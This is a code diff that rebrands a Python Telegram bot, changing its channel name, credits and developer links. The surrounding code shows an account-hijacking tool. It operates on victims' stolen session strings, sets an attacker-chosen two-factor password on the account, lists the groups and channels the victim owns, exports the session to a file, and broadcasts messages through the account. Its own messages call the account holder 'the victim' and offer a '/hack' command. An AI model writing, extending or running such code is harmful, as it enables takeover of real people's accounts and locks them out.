@@ -1,6 +1,6 @@
 
-from jepthon import bot, jepiq
-#By Source aljoker @jepthon
+from source_av import bot, jepiq
+#By Source aljoker @source_av
 from telethon import events, functions, types, Button
 from datetime import timedelta
 import asyncio
@@ -76,7 +76,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('source_av')
       return True
     except:
       return False
@@ -156,7 +156,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "jepthon"
+channel = "source_av"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -187,7 +187,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة افاتار @Jepthon
+قم بلأنضمام الى قناة افاتار @source_av
 '''
 
 keyboard = [
@@ -212,7 +212,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس افاتار 🤡", "https://t.me/jepthon")
+    Button.url("سورس افاتار 🤡", "https://t.me/source_av")
     ]
 ]
 
@@ -254,7 +254,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/jepthon")
+            Button.url("المطور", "https://t.me/ALMORTAGEL_12")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -275,7 +275,7 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @Jepthon")
+        file.write(i + "\n\nDetails BY @source_av")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -486,7 +486,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/Jepthon")
+        Button.url("القناة", "https://t.me/source_av")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
